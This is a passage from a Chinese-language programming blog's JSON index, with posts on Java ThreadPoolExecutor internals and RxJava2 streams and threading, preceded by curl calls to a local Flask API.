&#39;{&quot;email&quot;:&quot;user3@gmail.com&quot;,&quot;username&quot;:&quot;user3&quot;,&quot;password&quot;:&quot;useronepwd&quot;}&#39; --header &quot;Content-Type:application/json&quot; &quot;http://127.0.0.1:3333/login&quot; curl -X GET -d --header &quot;Content-Type:application/json&quot; --header &quot;Authorization:JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzEzMDMxMTQsImlhdCI6MTUzMTMwMzA4NCwiaXNzIjoia2VuIiwiZGF0YSI6eyJpZCI6MiwibG9naW5fdGltZSI6MTUzMTMwMzA4NH19.04xDT6H2qoKzXpMZygFDIf8kpo4ksEl8J_mzvotgOoA&quot; &quot;http://127.0.0.1:3333/user&quot; 当然实际开发中还是图形化界面最方便 flask设置status code似乎只需要在return后面加上一个200这样的code就可以了 How Do Python Coroutines Work?关于python的socket api，这里有一篇介绍","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"java线程池的实现原理","date":"2017-04-30T19:17:45.000Z","path":"2017/04/30/2017-04-30-concurrency-and-beyond/","text":"原本只打算写一点关于线程池的实现原理，后来发现坑越挖越大。不得不写到一半停下来，所以，这算是一篇不那么完善的关于原理的解析吧。 线程池的常规使用方式通常说的线程池对外表现为具有一系列操作功能的接口，Executor提供了execute一个runnable的功能，而其子类ExecutorService则对外提供了更多的实用功能，所以平时用的都是ExecutorService的实现类。 public interface Executor { /** * Executes the given command at some time in the future. The command * may execute in a new thread, in a pooled thread, or in the calling * thread, at the discretion of the {@code Executor} implementation. * * @param command the runnable task * @throws RejectedExecutionException if this task cannot be * accepted for execution * @throws NullPointerException if command is null */ void execute(Runnable command); } public interface ExecutorService extends Executor{ } public abstract class AbstractExecutorService implements ExecutorService { } public class ThreadPoolExecutor extends AbstractExecutorService { } 更具体一点来说，java.util.concurrent.ThreadPoolExecutor这个类提供了上述接口的具体实现，同时对外提供了一些hook(beforeExecute、afterExecute等)，当然开发者也可以继承这个方法，实现更多自定义功能。它的构造函数如下： public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue) { this(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, Executors.defaultThreadFactory(), defaultHandler); } 但实际上，java不建议这样直接弄一个线程池出来，而是使用java.util.concurrent.Executors中的一些现成的工厂方法来创建一个线程池实例，具体的方法名很好理解，newFixedThreadPool，newSingleThreadExecutor，newCachedThreadPool等等。关于线程池构造函数各个参数的意义以及Executors提供的各种线程方法的适用场合，网上有很多详尽的文章。 //Thread有六种状态 public enum State { NEW, RUNNABLE, BLOCKED, WAITING, TIMED_WAITING, TERMINATED; } //ThreadPoolExecutor中用一个AtomicInteger的前三位表示当前state，后29位表示worker的数量。通过AtomicInteger的CAS操作保证多线程之间看到的worker数和当前state是一致的； private final AtomicInteger ctl = new AtomicInteger(ctlOf(RUNNING, 0)); //用一个ReentrantLock来锁住对workers这个HashSet的添加，删除操作 private final HashSet&lt;Worker&gt; workers = new HashSet&lt;Worker&gt;(); 这里针对execute方法具体的实现来展开，即，如何做到自动扩容，如何做到线程缓存，如何实现终止，以及资源同步问题。 public void execute(Runnable command) { if (command == null) throw new NullPointerException(); /* * Proceed in 3 steps: * * 1. If fewer than corePoolSize threads are running, try to * start a new thread with the given command as its first * task. The call to addWorker atomically checks runState and * workerCount, and so prevents false alarms that would add * threads when it shouldn&#39;t, by returning false. * * 2. If a task can be successfully queued, then we still need * to double-check whether we should have added a thread * (because existing ones died since last checking，上一次检查之后可能有线程挂掉了) or that * the pool shut down since entry into this method. So we * recheck state and if necessary roll back the enqueuing if * stopped, or start a new thread if there are none. * * 3. If we cannot queue task, then we try to add a new * thread. If it fails, we know we are shut down or saturated * and so reject the task. */ int c = ctl.get(); if (workerCountOf(c) &lt; corePoolSize) { // // Core pool size is the minimum number of workers to keep alive (and not allow to time out etc) unless allowCoreThreadTimeOut is set, in which case the minimum is zero. if (addWorker(command, true))//true表示创建新的Worker时的上限是coolPoolSize,false表示上限是maximunPoolSize 一般前者都小于等于后者，成功创建新的Worker并执行任务的话,直接在这里就return掉了 return; c = ctl.get(); //当前pool的state,ctl是一个AtomicInteger } if (isRunning(c) &amp;&amp; workQueue.offer(command)) {//addworker就是创建一个新的Worker并立即执行command，没能成功就得暂时放进queue了。offer就是往这里面加一个runnable int recheck = ctl.get();//recheck的原因源码中也说明了 //走到这一步，说明已经成功加入到队列中了。 if (! isRunning(recheck) &amp;&amp; remove(command)) reject(command);//pool随时可能会被关掉 else if (workerCountOf(recheck) == 0) addWorker(null, false); } else if (!addWorker(command, false)) reject(command); } 来看addWorker的实现 //ThreadPoolExecutor.java private boolean addWorker(Runnable firstTask, boolean core) { //下面是一个循环，假设线程池不关闭的话，循环去cas实现workerCount自增。但如果workerCount已经大于最大数量的话，则会失败 retry: for (;;) { int c = ctl.get(); int rs = runStateOf(c); // Check if queue empty only if necessary. if (rs &gt;= SHUTDOWN &amp;&amp; ! (rs == SHUTDOWN &amp;&amp; firstTask == null &amp;&amp; ! workQueue.isEmpty())) return false; //每一次尝试设置workerCount之前都会检查一下当前是否关闭 for (;;) { int wc = workerCountOf(c); if (wc &gt;= CAPACITY || wc &gt;= (core ? corePoolSize : maximumPoolSize)) return false; if (compareAndIncrementWorkerCount(c)) break retry;// 只有自增成功才会跳出循环，否则一直尝试；如果没有自增成功，继续 c = ctl.get(); // Re-read ctl if (runStateOf(c) != rs)//看下当前状态是否发生了变化，一旦变化就要检查当前是否关闭，所以跳到外部循环 continue retry; // else CAS failed due to workerCount change; retry inner loop } } //走到这里说明自增成功了，在worker数量小于limit的时候，几乎一定能够添加worker成功 boolean workerStarted = false; boolean workerAdded = false; Worker w = null; try { w = new Worker(firstTask); final Thread t = w.thread; if (t != null) { final ReentrantLock mainLock = this.mainLock; mainLock.lock(); try { // Recheck while holding lock. // Back out on ThreadFactory failure or if // shut down before lock acquired. int rs = runStateOf(ctl.get()); if (rs &lt; SHUTDOWN || (rs == SHUTDOWN &amp;&amp; firstTask == null)) { if (t.isAlive()) // precheck that t is startable throw new IllegalThreadStateException(); workers.add(w); int s = workers.size(); if (s &gt; largestPoolSize) largestPoolSize = s; workerAdded = true; } } finally { mainLock.unlock(); } if (workerAdded) { t.start(); //这个Thread的构造函数里传入了一个Runnable，也就是Worker自身 workerStarted = true; } } } finally { if (! workerStarted) addWorkerFailed(w); } return workerStarted; } // 上面在addWorker中，workerCount自增成功后就会 final void runWorker(Worker w) { //每一条线程运行起来的时候都会走这个方法 try { while (task != null || (task = getTask()) != null) { w.lock();//task可能是第一个runnable，也可能是从queue中取出来的 //getTask方法就是不断的从队列中获取任务。注意之前addTask的方法入参说明,command是该worker执行的第一个任务。也就是说，一个worker之后还有可能从queue中获取新的任务。线程能够一直有任务执行，就不会进入死亡状态(Thread有几个状态) try { beforeExecute(wt, task);//钩子 Throwable thrown = null; try { task.run(); } catch (RuntimeException x) { thrown = x; throw x; } catch (Error x) { thrown = x; throw x; } catch (Throwable x) { thrown = x; throw new Error(x); } finally { afterExecute(task, thrown);//钩子 } } finally { task = null; w.completedTasks++; w.unlock(); } } completedAbruptly = false; } finally { processWorkerExit(w, completedAbruptly); //在这里从workers的HashSet中移除当前worker } } addWorker会创建一个新的Worker(线程)，并将command作为这个线程要执行的第一个任务，而Worker的run方法是线程跑起来执行的方法。至于如何实现从queue中获取任务交给线程去完成，看getTask方法 private Runnable getTask() { boolean timedOut = false; // Did the last poll() time out? for (;;) { //轮询 boolean timed = allowCoreThreadTimeOut || wc &gt; corePoolSize; //如果当前worker数量超出了corePoolSize，就要允许我这条线程挂掉 try { Runnable r = timed ? workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS) : //queue的poll是立刻返回的,poll(time,unit)是等待超时返回，take则是阻塞 workQueue.take(); // 如果当前没有超过核心线程数，就用take，否则，超过keepAlive时间就设置timedOut为true，重新走一遍循环的时候会cas把当前worker数量自减 if (r != null) return r; } catch (InterruptedException retry) { timedOut = false; } } } 整体来说，executor.execute方法就是通过new出Woker，而Worker则会在run方法中不停的从queue中获取新的任务，从而确保线程不会挂掉。也就是所谓的线程池缓存了线程，避免了频繁创建线程的开销。 Worker这个类继承自AbstractQueuedSynchronizerAbstractQueuedSynchronizer即大名鼎鼎的AQS。 Reetranlock的使用这其中有注意上面使用了重入锁 ReentrantLock，后来发现ThreadPoolExecutor中多处使用了这个类。 Future,Callable,FutureTask等等 最后，今天下午看到很多jdk里源码的注释，作者都是 Doug Lea ，实在佩服前人的功力。之前也看过一些自定义线程池的实现，现在看起来确实差很多，不要重复造轮子不意味着不需要去了解轮子是怎么造出来的。 自定义线程池的话，有一些经验公式简单来说，就是如果你是CPU密集型运算，那么线程数量和CPU核心数相同就好，避免了大量无用的切换线程上下文。如果你是IO密集型的话，需要大量等待，那么线程数可以设置的多一些，比如CPU核心乘以2. Reference Java 多线程：线程池实现原理","tags":[{"name":"concurrency","slug":"concurrency","permalink":"https://haldir65.github.io/tags/concurrency/"}]},{"title":"Rxjava2 的一些点","date":"2017-04-23T13:56:07.000Z","path":"2017/04/23/2017-04-23-rxjava2-for-android/","text":"本文多数内容来自Jake Wharton的演讲，配合一些个人的感受，作为今后使用Rxjava2的一些参考。 1. Why Reactive?最早使用Rxjava的初衷在于方便地实现线程切换，使用链式语法轻松地将异步任务分发到子线程并省去了主动实现回调的麻烦。我们生活在一个事件异步分发的环境中，网络，文件、甚至用户输入本身也是异步事件，除此之外，安卓系统本身的许多操作也是异步的，例如startActivity，Fragment的transaction，这就要求开发者不得不考虑各种事件状态，并在各种事件之间进行协调。Rxjava将各种事件的处理、完成以及异常在事件定义之初定义好处理方式。事件的开始，进行，完成以及异常，都被抽象到Observable的载体中。值得注意的是，这种链式调用很像Builder Pattern，但本质上每一步都生成了一个新的对象。这个在Rxjava的Wiki上有所说明，即每一步都生成一个新的immutable object（GC表示压力大）。 2. 数据源Stream基本包括这三部分 source of data listener of data methods for modifying data 2.1 数据源的种类Observable 和Flowable，区别在于后者支持BackPressure，后者不支持BackPressure.接收Observable和Flowable的类型分别为Observer和Subscriber interface Observer&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Disposable d); } interface Disposable{ void dispose(); } interface Subscriber&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Subscription s); } interface Subscription{ void cancel(); //用于取消订阅，释放资源 void request(long r) ;//请求更多的数据，即BackPressure开始体现的地方 } 两者的区别在于最后一个方法，以Disposable为例，当你开始subscribe一个数据源的时，就类似于创建了一个Resurce，而Resource是往往需要在用完之后及时释放。无论是Observable还是Flowable,这个onSubscribe方法会在订阅后立即被调用，这个方法里的Disposable可以保留下来，在必要时候用于释放资源。如Activity的onDestroy中cancel network request. 2.2 数据源的对应类Single (订阅一个Single，要么获得仅一个返回值，要么出现异常返回Error) public abstract class Single&lt;T&gt; implements SingleSource&lt;T&gt; {} Completeable (订阅一个completeable，要么成功，不返回值，要么出现异常返回error，就像一个reactive runnale，一个可以执行的command，并不返回结果) public abstract class Completable implements CompletableSource {} 例如，异步写一个文件，要么成功，要么出现error，并不需要返回什么。 public void writeFile(Stirng data){} // 就可以model成 Completeable writeFile(Stirng data){} Maybe (有可能返回值，有可能不返回，也有可能异常，即optional) public abstract class Maybe&lt;T&gt; implements MaybeSource&lt;T&gt; {} 以上三种数据源都有static方法生成：例如 比较推荐的方法有两种 一. fromCallableObservable.fromCallable(new Callable&lt;String&gt;(){ @override public String call() throw Exception{ return getName() // 之前是synchronious的get，现在这一步可以asynchnous执行,比如放一个OkHttpClient.newCall(request).execute(); //因为是异步执行的，也不存在性能问题 } }) 上面这段中的call方法会在被订阅后执行，成功的话会走到observer的onNext，失败的话会走到onError。fromCallable可用于各种数据源，包括Flowable Flowable.fromCallable(() -&gt; &quot;Hello Flowable&quot;); Observable.fromCallable(() -&gt; &quot;Hello Observable&quot;); Maybe.fromCallable(() -&gt; &quot;Hello Maybe&quot;); Single.fromCallable(() -&gt; &quot;Hello Single&quot;); Completeable.fromCallable(() -&gt; &quot;Hello Completeable&quot;); fromCallable are for modeling synchronous sourse of a single source of data. 很多需要返回值的方法都可以抽象成这种方法。Maybe和Completeable还有两个方法,用于表示不返回数据的方法 Maybe.fromAction(() -&gt; &quot;Hey jude&quot;) Maybe.fromRunnable(() -&gt; &quot;ignore&quot;) Completeable.fromAction(() -&gt; &quot;Hey jude&quot;) Completeable.fromRunnable(() -&gt; &quot;ignore&quot;) 二. create(Rxjava 1中不推荐使用该方法，Rxjava2中建议使用)Observable.create(new ObservableOnSubscribe&lt;String&gt;()){ @override public void subscribe (ObservableEmitter&lt;String&gt; e) throws Exception{ //subscribe get called whenever there&#39;s a new subscriber, emitter is the person that&#39;s listening. // e.onNext(&quot;Hello&quot;); e.onComplete(); } } 一个Observable可以有多个subscriber。一个被观察者可以有多个观察者，被观察者的onNext调用，观察者的onNext也会被调用 lambda更简洁 Observable.create(e -&gt;{ e.onNext(&quot;Hello&quot;); e.onNext(&quot;Hello&quot;); e.onComplete(); }) Okhttp的异步网络请求也可以model成一种被观察的流 Observable.create(e -&gt;{ Call call = client.newCall(request); call.enqueue(new Callback()){ @Override public void onResponse(Response r) throws IOException{ e.onNext(r.body().toString()); e.onComplete(); } @Override public void onFailure(IOException e){ e.onError(e); } } }) //重点了来了， public interface ObservableEmitter&lt;T&gt; extends Emitter&lt;T&gt; { /** * Sets a Cancellable on this emitter; any previous Disposable * or Cancellation will be unsubscribed/cancelled. * @param c the cancellable resource, null is allowed */ void setCancellable(Cancellable c); } // emitter可以设置cancel的动作 Observable.create(e -&gt;{ e.setCacelation(() -view.setOnClickListener(null)); view.setOnClickListener(v -&gt; e.onNext()); }) // 点击按钮发送事件，取消订阅时避免leak View // 和fromCallable一样，create方法也适用于所有五种data source 3. 如何订阅（接收）这些数据3.1 observer和Subscriber接收Observable和Flowable的类型分别为Observer和Subscriber interface Observer&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Disposable d); } interface Disposable{ void dispose(); } interface Subscriber&lt;T&gt;{ void onNext(T t); void onComplete(); void onError(Throwable t); void onSubscribe(Subscription s); } interface Subscription{ void cancel(); //用于取消订阅，释放资源 void request(long r) ;//请求更多的数据，即BackPressure开始体现的地方 } 所以整体来看，数据的流向就这么两种，左边发送数据(可能只有一个，可能间歇性的，可能一直不停)，事件通过数据流传输到右边，右边根据协议作出相应(Reactive)Observable -&gt; subscribe -&gt; Observer Flowable -&gt; subscribe -&gt; Subscription 3.2 onSubscribe怎么用通常不直接用这两种base class，因为第四个方法不知道怎么用嘛。 Observable.just(&quot;Hello&quot;).subscribe(new DisposableObserver&lt;String&gt;() { @Override public void onNext(String value) { } @Override public void onError(Throwable e) { } @Override public void onComplete() { } }); // 可以持有DisposableObserver，在停止订阅的时候调用observer.dispose方法，切断流。 // 或者这样 Disposable disposable = Observable.just(&quot;Hello&quot;).subscribeWith(new DisposableObserver&lt;String&gt;() { @Override public void onNext(String value) { } @Override public void onError(Throwable e) { } @Override public void onComplete() { } }); // subscribeWith返回一个Disposable，subscribe是一个没有返回值的函数 // 偷懒一点的话，通常把这些返回的订阅加入到一个CompositeDisposable,在onDestroy的时候统一取消订阅即可 // Observable、Single、Completeable、Maybe以及Flowable都支持subscribewith。 4. 数据源和接受者建立联系 Observable.subscribe或者Flowable.subscribe或者使用之前提到的sbscribeWith我尝试写了一个比较复杂的调用顺序```javaObservable.fromCallable(new Callable&lt;List&gt;() { @Override public List call() throws Exception { LogUtil.p(“call do on thread any”); blockThread(2000); // block 2s return Arrays.asList(array); } }).subscribeOn(Schedulers.computation()) .observeOn(AndroidSchedulers.mainThread()) .doOnSubscribe(new Consumer() { @Override public void accept(Disposable disposable) throws Exception { LogUtil.p(“”); } }).doOnComplete(new Action() { @Override public void run() throws Exception { LogUtil.p(“”); } }).doOnNext(new Consumer&lt;List&gt;() { @Override public void accept(List strings) throws Exception { LogUtil.p(“” + strings.get(0)); } }).doAfterNext(new Consumer&lt;List&gt;() { @Override public void accept(List strings) throws Exception { LogUtil.p(“”+strings.get(0)); } }).subscribe(new Observer&lt;List&gt;() { @Override public void onSubscribe(Disposable d) { LogUtil.p(“onSubscribe “ + d.isDisposed()); } @Override public void onNext(List&lt;String&gt; value) { LogUtil.p(&quot; get Response &quot; + value.size()); value.set(0, &quot;change first element!&quot;); } @Override public void onError(Throwable e) { } @Override public void onComplete() { LogUtil.p(&quot;&quot;); } }); // 执行顺序：（括号内数字表示线程id）// doOnsubscribe(1) -&gt; onSubscribe(1) -&gt; call(276) -&gt;doOnNext(1)-&gt;onNext(1) -&gt; doAfterNext(1) -&gt;doOnComplete(1)-&gt;onComplete(1)// 所以基本上可以认为doOnXXX= doBeforeXXX,线程都是一样的。估计是为了打日志用的，或者说用于切片。// 像极了OkHttp的interecpter或是gradle的task。 ## 5. Operator and Threading ```java Observable&lt;String&gt; greeting = Observable.just(&quot;Hello&quot;); Observable&lt;String&gt; yelling = greeting.map(s -&gt;s.toUppercase()) Observable.subscribeOn(Schedulers.io()) // subscribeOn决定了task在哪条线程上运行，操作符的顺序很重要this is wrong this is right 流之间的转换 Observable -&gt; first() -&gt; singleObservable -&gt; firsetElement -&gt; MaybeObservable -&gt; ignoreElements() -&gt;Completable Flowable -&gt; first() -&gt; singleFlowable -&gt; firsetElement -&gt; MaybeFlowable -&gt; ignoreElements() -&gt;Completable Combining Observables 多个数据来源的加工 updates: 复制一些实例merge(): // 用于存放最终展示的数据 String result = &quot;数据源来自 = &quot; ; /* * 设置第1个Observable：通过网络获取数据 * 此处仅作网络请求的模拟 **/ Observable&lt;String&gt; network = Observable.just(&quot;网络&quot;); /* * 设置第2个Observable：通过本地文件获取数据 * 此处仅作本地文件请求的模拟 **/ Observable&lt;String&gt; file = Observable.just(&quot;本地文件&quot;); /* * 通过merge（）合并事件 &amp; 同时发送事件 **/ Observable.merge(network, file) .subscribe(new Observer&lt;String&gt;() { @Override public void onSubscribe(Disposable d) { } @Override public void onNext(String value) { Log.d(TAG, &quot;数据源有： &quot;+ value ); result += value + &quot;+&quot;; } @Override public void onError(Throwable e) { Log.d(TAG, &quot;对Error事件作出响应&quot;); } // 接收合并事件后，统一展示 @Override public void onComplete() { Log.d(TAG, &quot;获取数据完成&quot;); Log.d(TAG, result ); } }); zip() ，比如要同时拉两个接口 public class MainActivity extends AppCompatActivity { private static final String TAG = &quot;Rxjava&quot;; // 定义Observable接口类型的网络请求对象 Observable&lt;Translation1&gt; observable1; Observable&lt;Translation2&gt; observable2; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // 步骤1：创建Retrofit对象 Retrofit retrofit = new Retrofit.Builder() .baseUrl(&quot;http://fy.iciba.com/&quot;) // 设置 网络请求 Url .addConverterFactory(GsonConverterFactory.create()) //设置使用Gson解析(记得加入依赖) .addCallAdapterFactory(RxJava2CallAdapterFactory.create()) // 支持RxJava .build(); // 步骤2：创建 网络请求接口 的实例 GetRequest_Interface request = retrofit.create(GetRequest_Interface.class); // 步骤3：采用Observable&lt;...&gt;形式 对 2个网络请求 进行封装 observable1 = request.getCall().subscribeOn(Schedulers.io()); // 新开线程进行网络请求1 observable2 = request.getCall_2().subscribeOn(Schedulers.io());// 新开线程进行网络请求2 // 即2个网络请求异步 &amp; 同时发送 // 步骤4：通过使用Zip（）对两个网络请求进行合并再发送 Observable.zip(observable1, observable2, new BiFunction&lt;Translation1, Translation2, String&gt;() { // 注：创建BiFunction对象传入的第3个参数 = 合并后数据的数据类型 @Override public String apply(Translation1 translation1, Translation2 translation2) throws Exception { return translation1.show() + &quot; &amp; &quot; +translation2.show(); } }).observeOn(AndroidSchedulers.mainThread()) // 在主线程接收 &amp; 处理数据 .subscribe(new Consumer&lt;String&gt;() { // 成功返回数据时调用 @Override public void accept(String combine_infro) throws Exception { // 结合显示2个网络请求的数据结果 Log.d(TAG, &quot;最终接收到的数据是：&quot; + combine_infro); } }, new Consumer&lt;Throwable&gt;() { // 网络请求错误时调用 @Override public void accept(Throwable throwable) throws Exception { System.out.println(&quot;登录失败&quot;); } }); } } replay操作符：一个source先创建，发送了3个事件后，有一个subscriber才开始subscribe，这时会把之前的3个事件和之后的陆续事件都丢给subscriber。 链式调用每一步都生成了新的object，Rxjava2和Rxjava1相比，对GC更加友好。quote:RxJava 2 is not something new. Reactive programming is not new by any stretch, but Android itself is a highly reactive world that we’ve been taught to model in a very imperative, stateful fashion.Reactive programming allow us to model it in the proper way: asynchronously. Embrace the asynchronicity of the sources, and instead of trying to manage all the state ourselves, compose them together such that our apps become truly reactive. updates:How about Error Handling ?Error handling in RxJava Rxjava2中的Subscriber是遵循reactive stream这个项目中的规范的，后者提供了backpressure支持observable(事实上是observableSource) -&gt; observerFlowable(publisher接口) -&gt; Subscriberwhat-is-the-difference-between-an-observer-and-a-subscriber java还有这种写法 PublishSubject.&lt;T&gt;create() Flowable中默认的bufferSize是128，这个是在源码中定义的:Flowable.bufferSize()方法默认返回的就是128 MissingBackpressureException和BufferOverFlowException应该是不一样的 在相同的一条线程中，是不存在背压的问题的，不同线程之间的消费者和生产者之间可能产生背压问题。就算消费者线程中不写Thread.sleep()也是有可能出现MissingBackPressureException。 Flowable这种直接遵循上游响应下游request请求才发送数据 var sp5:Subscription?= null btn5.setOnClickListener { Flowable.create&lt;String&gt;({emitter -&gt; for(i in 0..1000){ emitter.onNext(i.toString()) LogUtil.e(TAG,&quot;send down message $i&quot;) } emitter.onComplete() },BackpressureStrategy.BUFFER) .subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()) .subscribe(object :FlowableSubscriber&lt;String&gt;{ override fun onComplete() { LogUtil.e(TAG,&quot;OnComplete called &quot;) } override fun onSubscribe(s: Subscription) { sp5 = s sp5?.request(1) } override fun onNext(t: String?) { LogUtil.e(TAG,&quot;receive message $t&quot;) Thread.sleep(100) sp5?.request(1) } override fun onError(t: Throwable?) { LogUtil.e(TAG,t?.message) } }) } Flowable.fromPublisher()方法接受一个Publisher参数，但是但是但是 Note that even though Publisher appears to be a functional interface, it is not recommended to implement it through a lambda as the specification requires state management that is not achievable with a stateless lambda. rxjava线程切换的原理线程切换的原理以及subscribeOn只能用一次的原因Observable.observeOn() @CheckReturnValue @SchedulerSupport(SchedulerSupport.CUSTOM) public final Observable&lt;T&gt; observeOn(Scheduler scheduler, boolean delayError, int bufferSize) { ObjectHelper.requireNonNull(scheduler, &quot;scheduler is null&quot;); ObjectHelper.verifyPositive(bufferSize, &quot;bufferSize&quot;); return RxJavaPlugins.onAssembly(new ObservableObserveOn&lt;T&gt;(this, scheduler, delayError, bufferSize)); } observeOn方法实际返回了一个ObservableObserveOn实例。外部调用subscribe -&gt; ObservableObserveOn.subScribeActual -&gt; 上游source.subscribe(new ObserveOnObserver(observer, w, delayError, bufferSize))，这个observer是外部调用者写的，等于说这个ObserveOnObserver是上游（actual）和下游(开发者写的observer)之间的桥梁，在收到上游onNext的时候会最终走到NewThreadWorker.scheduleDirect @NonNull public ScheduledRunnable scheduleActual(final Runnable run, long delayTime, @NonNull TimeUnit unit, @Nullable DisposableContainer parent) { // ... ScheduledRunnable sr = new ScheduledRunnable(decoratedRun, parent); Future&lt;?&gt; f; try { if (delayTime &lt;= 0) { f = executor.submit((Callable&lt;Object&gt;)sr); } else { f = executor.schedule((Callable&lt;Object&gt;)sr, delayTime, unit); } sr.setFuture(f); } catch (RejectedExecutionException ex) { //.... } return sr; } 返回了一个ScheduledRunnable,里面包装了一个Future。往executor提交了task之后，task的run方法将被执行，也就是ScheduledRunnable的run方法 @Override public void run() { lazySet(THREAD_INDEX, Thread.currentThread()); try { try { actual.run(); } catch (Throwable e) { // Exceptions.throwIfFatal(e); nowhere to go RxJavaPlugins.onError(e); } } finally { //... if (o != PARENT_DISPOSED &amp;&amp; compareAndSet(PARENT_INDEX, o, DONE) &amp;&amp; o != null) { ((DisposableContainer)o).delete(this); } for (;;) { o = get(FUTURE_INDEX); if (o == SYNC_DISPOSED || o == ASYNC_DISPOSED || compareAndSet(FUTURE_INDEX, o, DONE)) { break;//判断当前处于DONE的状态的话就可以跳出循环 } } } } 回头看ObserveOnObserver 的创建， new ObservableObserveOn&lt;T&gt;(this, scheduler, delayError, bufferSize));//这个this是Observable 接下来开始subScribe -&gt; subScribeActual @Override protected void subscribeActual(Observer&lt;? super T&gt; observer) { if (scheduler instanceof TrampolineScheduler) { source.subscribe(observer); } else { Scheduler.Worker w = scheduler.createWorker(); source.subscribe(new ObserveOnObserver&lt;T&gt;(observer, w, delayError, bufferSize)); //这个source就是上面的Observable。这个ObserveOnObserver就像我们平时写的Observer一样，有onNext,onComplete,onError等 } } //下面是ObserveOnObserver的构造函数 ObserveOnObserver(Observer&lt;? super T&gt; actual, Scheduler.Worker worker, boolean delayError, int bufferSize) { this.actual = actual; this.worker = worker; this.delayError = delayError; this.bufferSize = bufferSize; } @Override public void onNext(T t) { if (done) { return; } if (sourceMode != QueueDisposable.ASYNC) { queue.offer(t); //这里，把上游的数据存进queue } schedule(); } void schedule() { if (getAndIncrement() == 0) { worker.schedule(this); //显然这个this是一个runnable } } @Override public void run() { if (outputFused) { drainFused(); } else { drainNormal(); } } //一个for循环 void drainNormal() { // for (;;) { boolean d = done; T v; try { v = q.poll(); } catch (Throwable ex) { // .. } //.. a.onNext(v); } } 整理一下，上游的Observable发出OnNext的时候，ObserveOnObserver开始schedule,也就是通过worker.schedule将任务调度到新的线程。新的线程运行run方法中for循环从queue中查找result。ObserveOnObserver就是在onNext中接收到上游数据，存到queue里面之后，调度另一条线程去跑一个run方法，该方法会去drain这个queue，也就是取出刚才放进去的数据 SubscribeOn也是类似的道理SubscribeOn返回了一个ObservableSubscribeOn实例ObservableSubscribeOn @Override public void subscribeActual(final Observer&lt;? super T&gt; s) { final SubscribeOnObserver&lt;T&gt; parent = new SubscribeOnObserver&lt;T&gt;(s); s.onSubscribe(parent); parent.setDisposable(scheduler.scheduleDirect(new SubscribeTask(parent))); //scheduleDirect就是把task丢到scheduler的线程 } 顺便提一下io.reactivex.schedulers.Schedulers典型的线程安全单例模式 static final class SingleHolder { static final Scheduler DEFAULT = new SingleScheduler(); } static final class ComputationHolder { static final Scheduler DEFAULT = new ComputationScheduler(); } static final class IoHolder { static final Scheduler DEFAULT = new IoScheduler(); } static final class NewThreadHolder { static final Scheduler DEFAULT = new NewThreadScheduler(); } 这些Scheduler都继承Scheduler这个abstract class @NonNull public abstract Worker createWorker(); Schedulers.io() —&gt; io.reactivex.internal.schedulers.IoScheduler //尽量cache,忙不过来的话创建新的线程Schedulers.computation() io.reactivex.internal.schedulers.ComputationScheduler //只是维持了cpu核心数以内的线程，有任务来的时候round-robin /** * Holds a fixed pool of worker threads and assigns them * to requested Scheduler.Workers in a round-robin fashion. */ public final class ComputationScheduler extends Scheduler implements SchedulerMultiWorkerSupport { private static final String THREAD_NAME_PREFIX = &quot;RxComputationThreadPool&quot;; //这个熟悉的字眼 @NonNull @Override public Worker createWorker() { return new EventLoopWorker(pool.get().getEventLoop()); } } /** * Scheduler that creates and caches a set of thread pools and reuses them if possible. */ public final class IoScheduler extends Scheduler { @NonNull @Override public Worker createWorker() { return new EventLoopWorker(pool.get()); } } //EventLoopWorker实际上代理了PoolWorker（继承NewThreadWorker）的工作 public class NewThreadWorker extends Scheduler.Worker implements Disposable { private final ScheduledExecutorService executor; //有一个scheduleAtFixedRate的功能可以拿来做定时任务 volatile boolean disposed; public NewThreadWorker(ThreadFactory threadFactory) { executor = SchedulerPoolFactory.create(threadFactory); } } 为什么多个subscribeOn没有卵用就是下面这种 Observable.just(1) .map(new Function&lt;Integer, Integer&gt;() { @Override public Integer apply(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;map-1:&quot;+Thread.currentThread().getName()); //实际运行在RxNewThreadScheduler-1上 return integer; } }) .subscribeOn(Schedulers.newThread()) .map(new Function&lt;Integer, Integer&gt;() { @Override public Integer apply(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;map-2:&quot;+Thread.currentThread().getName());//实际运行在RxNewThreadScheduler-1上 return integer; } }) .subscribeOn(Schedulers.io()) .map(new Function&lt;Integer, Integer&gt;() { @Override public Integer apply(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;map-3:&quot;+Thread.currentThread().getName());//实际运行在RxNewThreadScheduler-1上 return integer; } }) .subscribeOn(AndroidSchedulers.mainThread()) .subscribe(new Consumer&lt;Integer&gt;() { @Override public void accept(@NonNull Integer integer) throws Exception { Log.i(TAG, &quot;subscribe:&quot;+Thread.currentThread().getName());//实际运行在RxNewThreadScheduler-1上 } }); 官方文档这么说的： the SubscribeOn operator designates which thread the Observable will begin operating on, no matter at what point in the chain of operators that operator is called. ObserveOn, on the other hand, affects the thread that the Observable will use below where that operator appears. For this reason, you may call ObserveOn multiple times at various points during the chain of Observable operators in order to change on which threads certain of those operators operate. subScribeOn返回的是ObservableSubscribeOn它的subscribeActual里面主要做了这件事 scheduler.scheduleDirect(new SubscribeTask(parent)) //parent是自己包装的一个Observer,SubscribeTask的run方法就是upstream.subScribe(parent)，大致如此 ObservableSubscribeOn.subScribe会调用到ObservableSubscribeOn.subscribeActual —&gt; 调来调去回到SubscribeTask 的 run()，它又开始往上去订阅(subScribeActual)，如此循环到第一个位置 上层事件发生时，会一步步地调用actual.onNext -&gt; actual.onNext…这些actual的连接都是在上面几个不同的线程中连接上的。只是事件发生时，没有走线程调度，直接从第一个scheduler的线程开始运行这段链条状的onNext调用，所以也就只有第一次subScribeOn有用了 Reference– 